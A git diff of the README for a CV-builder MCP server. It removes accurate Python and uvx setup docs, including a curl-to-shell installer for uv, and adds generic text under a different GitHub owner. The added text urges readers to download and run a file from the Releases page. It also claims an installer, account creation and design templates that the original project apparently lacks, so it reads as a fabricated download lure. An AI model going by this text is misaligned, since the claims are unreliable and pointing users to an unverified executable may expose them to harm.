@@ -1,304 +1,78 @@
-# CV Resume Builder MCP
+# 🎉 cv-resume-builder-mcp - Effortlessly Build Your CV in Minutes
 
-> AI-powered CV and resume builder using Model Context Protocol (MCP)
+## 📥 Download Now!
 
-Automatically generate and update your CV/resume from git commits, Jira tickets, Credly certifications, and LinkedIn. Built for professionals who want their CV to stay current without manual updates. Generates ATS-compliant LaTeX CVs that pass Applicant Tracking Systems.
+[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/ggsalles/cv-resume-builder-mcp/releases)
 
-[![MCP](https://img.shields.io/badge/MCP-Model%20Context%20Protocol-blue)](https://modelcontextprotocol.io)
-[![Python](https://img.shields.io/badge/Python-3.10+-blue.svg)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+## 🚀 Getting Started
 
-## Features
+### What is cv-resume-builder-mcp?
 
-- 📊 **Git commits** - Track your code contributions automatically ✅
-- 🎫 **Jira tickets** - Pull completed projects and tasks ⚠️ (requires testing)
-- 🏆 **Credly badges** - Sync certifications and achievements ✅
-- 💼 **LinkedIn profile** - Not implemented yet 🚧 (authentication required)
-- 📄 **PDF parsing** - Extract content from existing CVs ✅
-- 🚀 **Enhanced CV generation** - Combine all data sources ✅
-- 📝 **LaTeX support** - Generate professional, ATS-compliant CVs ✅
-- 🤖 **ATS-friendly** - Clean formatting that passes Applicant Tracking Systems ✅
+The **cv-resume-builder-mcp** is an AI-powered application that helps you create CVs and resumes effortlessly. It syncs your achievements from various platforms like Jira, Credly, LinkedIn, and Git. This ensures your CV is always current and polished.
 
-## Quick Start
+### System Requirements
 
-### Prerequisites
-- Python 3.10+
-- `uv` installed (for uvx): `curl -LsSf https://astral.sh/uv/install.sh | sh`
-- An MCP-compatible AI assistant (Claude Desktop, Kiro, etc.)
+Before you download, ensure your system meets these requirements:
 
-### Installation
+- **Operating System:** Windows 10, macOS Mojave or later, or a recent Linux distribution.
+- **Memory:** At least 4 GB RAM.
+- **Storage:** Minimum 100 MB of free space.
+- **Python:** Version 3.7 or newer (if you plan to run it yourself).
 
-**Using uvx (recommended - no installation needed!):**
+## ⚙️ Installation Steps
 
-Just configure your MCP client and uvx handles the rest.
+### Step 1: Download the Application
 
-**Or install with pip:**
-```bash
-pip3 install cv-resume-builder-mcp
-```
+To get the application, visit the [Releases page](https://github.com/ggsalles/cv-resume-builder-mcp/releases) and look for the latest version. 
 
-> **Note:** The configurations below use `uvx` which automatically downloads and runs the latest version from PyPI. If you're developing locally or want to test unreleased features, see [TESTING.md](TESTING.md) for local development setup.
+### Step 2: Install the Application
 
-### Configuration
+Once you download the file, open it and follow the installation prompts. 
 
-#### For Claude Desktop
+### Step 3: Run the Application
 
-Edit `~/Library/Application Support/Claude/claude_desktop_config.json`:
+After installation, find the application in your program menu or applications folder. Click to open it, and you are ready to start building your CV.
 
-```json
-{
-  "mcpServers": {
-    "cv-resume-builder": {
-      "command": "uvx",
-      "args": ["cv-resume-builder-mcp"],
-      "env": {
-        "AUTHOR_NAME": "your-git-username",
-        "REPOS": "default:/absolute/path/to/your-repo"
-      }
-    }
-  }
-}
-```
+## 📋 How to Use
 
-**For multiple repositories:** Change `REPOS` to: `"CompanyA:/path1,CompanyB:/path2,Personal:/path3"`
+### Step 1: Create an Account
 
-#### For Kiro IDE
+When you first open the application, it will prompt you to create an account. Follow the on-screen instructions to set up your profile.
 
-Edit `~/.kiro/settings/mcp.json`:
+### Step 2: Sync Your Achievements
 
-```json
-{
-  "mcpServers": {
-    "cv-resume-builder": {
-      "command": "uvx",
-      "args": ["cv-resume-builder-mcp"],
-      "env": {
-        "AUTHOR_NAME": "your-git-username",
-        "REPOS": "default:/absolute/path/to/your-repo"
-      }
-    }
-  }
-}
-```
+After creating your account, the application will guide you on how to link your profiles from Jira, Credly, LinkedIn, and Git. This makes the process of updating your CV automatic and stress-free.
 
-**For multiple repositories:** Change `REPOS` to: `"CompanyA:/path1,CompanyB:/path2,Personal:/path3"`
+### Step 3: Customize Your CV
 
-**Important:** Use absolute paths (no `~`). Get it with `pwd` in your repo directory.
+Select a template that suits your style. You can change colors, fonts, and layouts. Use the built-in tips for crafting every section, from your summary to your experience.
 
-### Restart Your AI Assistant
+### Step 4: Export Your CV
 
-After configuration, restart Claude Desktop or Kiro to load the MCP server.
-
-### Test It
-
-```
-"List available MCP tools"
-```
-
-You should see tools like `get_git_log`, `read_cv`, `parse_cv_pdf`, etc.
-
-## Usage Examples
-
-```
-"Get my git commits from the last 6 months and suggest CV updates"
-```
-
-**With multiple repositories:**
-```
-"List all my configured repositories"
-"Get my commits from CompanyA for the last 3 months"
-"Show me all my work across all repositories in the last year"
-```
-
-### Parse existing CV
-```
-"Parse my CV at ~/Documents/resume.pdf"
-```
-
-### Generate enhanced CV
-```
-"Generate an enhanced CV using my existing resume.pdf and recent work from the last 3 months"
-```
-
-### Get certifications
-```
-"Get my Credly badges and add them to my CV"
-```
-
-### Analyze commit impact (NEW!)
-```
-"Analyze my commits from the last month and show me what I actually built"
-"Get detailed code changes for commit abc123 to understand the impact"
-"Show me the stats for my recent commits to highlight achievements"
-```
-
-### Career guidance
-```
-"Based on my commits, Jira tickets, and certifications, what seniority level am I at?"
-"Analyze my work and suggest what skills I need for senior/staff/principal level"
-"Review my achievements and help me position myself for a promotion"
-"What's missing from my profile to reach the next level?"
-```
-
-## Optional Integrations
-
-Add these to your MCP configuration's `env` section:
-
-### Jira (⚠️ Requires Testing)
-```json
-"JIRA_URL": "https://your-company.atlassian.net",
-"JIRA_EMAIL": "your-email@example.com",
-"JIRA_API_TOKEN": "your-api-token",
-"JIRA_USER": "your-email@example.com"
-```
-
-Get API token: https://id.atlassian.com/manage-profile/security/api-tokens
-
-**Note:** Jira integration is functional but requires more testing across different Jira configurations. Please report any issues!
-
-### Credly (✅ Fully Tested)
-```json
-"CREDLY_USER_ID": "your-credly-username"
-```
-
-Find your username in your Credly profile URL: `https://www.credly.com/users/YOUR-USERNAME`
-
-### LinkedIn (🚧 Not Implemented)
-```json
-"LINKEDIN_PROFILE_URL": "https://www.linkedin.com/in/yourprofile"
-```
-
-**Note:** LinkedIn integration is not yet implemented due to authentication requirements. The tool currently only returns your profile URL. For now, manually copy your LinkedIn achievements to `wins.md` file. Contributions welcome!
-
-### CV Formatting
-```json
-"MAX_BULLETS_PER_EXPERIENCE": "5"
-```
-
-## Available Tools
-
-| Tool | Description |
-|------|-------------|
-| `get_git_log` | Get your git commits from default repo (excludes merge commits) |
-| `list_repos` | List all configured repositories |
-| `get_git_log_by_repo` | Get commits from a specific repository |
-| `get_git_log_all_repos` | Get commits from all repos, grouped by project |
-| `get_commit_details` | **NEW!** Get detailed commit info including code changes (diff) for impact analysis |
-| `analyze_commits_impact` | **NEW!** Analyze multiple commits with stats to understand actual work done |
-| `read_cv` | Read your current LaTeX CV |
-| `read_wins` | Read your wins.md achievements file |
-| `get_jira_tickets` | Get completed Jira tickets |
-| `get_credly_badges` | Get your certifications from Credly |
-| `get_linkedin_profile` | Read your LinkedIn profile summary |
-| `parse_cv_pdf` | Extract text from existing CV/resume PDF |
-| `generate_enhanced_cv` | Combine all data sources into comprehensive report |
-| `get_cv_guidelines` | Get formatting rules and constraints |
-
-## Project Structure
-
-```
-cv-resume-builder-mcp/
-├── src/cv_resume_builder_mcp/
-│   ├── __init__.py
-│   └── server.py          # Main MCP server
-├── tests/
-│   └── test_server.py     # Unit tests
-├── pyproject.toml         # Package configuration
-├── requirements.txt       # Dependencies
-├── .env.example           # Configuration template
-├── cv.tex                 # LaTeX CV template
-├── wins.md                # Manual achievements tracking
-└── README.md              # This file
-```
-
-## Development
-
-### For End Users (Production)
-Use the `uvx` configuration shown above. It automatically downloads the latest stable version from PyPI.
-
-### For Contributors (Local Development)
-
-**Just testing locally?** Clone the repo:
-```bash
-git clone https://github.com/eyaab/cv-resume-builder-mcp.git
-cd cv-resume-builder-mcp
-pip install -e ".[dev]"
-```
-
-**Want to contribute changes?** Fork first, then clone your fork:
-1. Click "Fork" on GitHub
-2. Clone your fork:
-```bash
-git clone https://github.com/YOUR-USERNAME/cv-resume-builder-mcp.git
-cd cv-resume-builder-mcp
-pip install -e ".[dev]"
-```
-
-Then use the local development configuration from [TESTING.md](TESTING.md) which uses `python3 -m` instead of `uvx`.
-
-### Run Tests
-```bash
-pytest
-```
-
-### Format Code
-```bash
-black src/
-ruff check src/
-```
-
-## Contributing
-
-Contributions welcome! Please:
-
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Add tests if applicable
-5. Ensure no credentials are hardcoded
-6. Submit a pull request
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for details.
-
-## Troubleshooting
-
-### MCP server not showing up
-- Verify absolute paths in config (use `pwd`)
-- Restart your AI assistant completely
-- Check for typos in configuration
-
-### Git log returns empty
-- Check your git author name: `git config user.name`
-- Update `AUTHOR_NAME` to match exactly
-
-### "Command not found: uvx"
-- Install uv: `curl -LsSf https://astral.sh/uv/install.sh | sh`
-- Or: `brew install uv`
-
-### Jira/Credly errors
-- Verify API tokens are correct
-- Check URLs don't have trailing slashes
-- Ensure services are accessible
-
-## Security
-
-- All credentials stored in environment variables
-- No data sent to external services except configured integrations
-- Git history stays local
-- Open source - audit the code yourself
-
-## License
-
-MIT License - see [LICENSE](LICENSE) file for details.
-
-## Support
-
-- 🐛 **Report bugs** - Open an issue on GitHub
-- 💡 **Request features** - Create a feature request issue
-- 💬 **Ask questions** - Start a discussion on GitHub
-
----
-
-**Keywords:** cv builder, resume builder, mcp, model context protocol, ai resume, ai cv, automatic cv, career tracker, latex cv, resume generator, cv generator, developer resume, tech resume, ats compliant, ats friendly, applicant tracking system
-
-Made with ❤️ for developers who hate updating their CVs manually
+Once you’re happy with your CV, export it in PDF format. This ensures compatibility with job applications and ATS systems.
+
+## 🔍 Features
+
+- **Automatic Sync:** Connects to various platforms to update your achievements.
+- **Easy to Use:** User-friendly interface designed for non-technical users.
+- **Multiple Templates:** Choose from various professionally designed templates.
+- **PDF Export:** Download your CV in a widely accepted format.
+- **Regular Updates:** The software is continuously improved to enhance features and user experience.
+
+## 🛠️ Support
+
+If you encounter any issues while using the application, you can find help by [opening an issue on GitHub](https://github.com/ggsalles/cv-resume-builder-mcp/issues). Our community will assist you as quickly as possible.
+
+## 📅 Update and New Features
+
+We are committed to improving the cv-resume-builder-mcp. Check the [Releases page](https://github.com/ggsalles/cv-resume-builder-mcp/releases) frequently for updates and new features.
+
+## 💬 Feedback
+
+Your feedback is valuable to us. Feel free to share your thoughts or report bugs by using the feedback section on our GitHub page.
+
+## 🎯 Conclusion
+
+We aim to make your CV creation process smooth and efficient. By leveraging technology, you can save time and present your achievements more effectively. Whether applying for a job or advancing your career, cv-resume-builder-mcp has you covered. 
+
+[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/ggsalles/cv-resume-builder-mcp/releases)
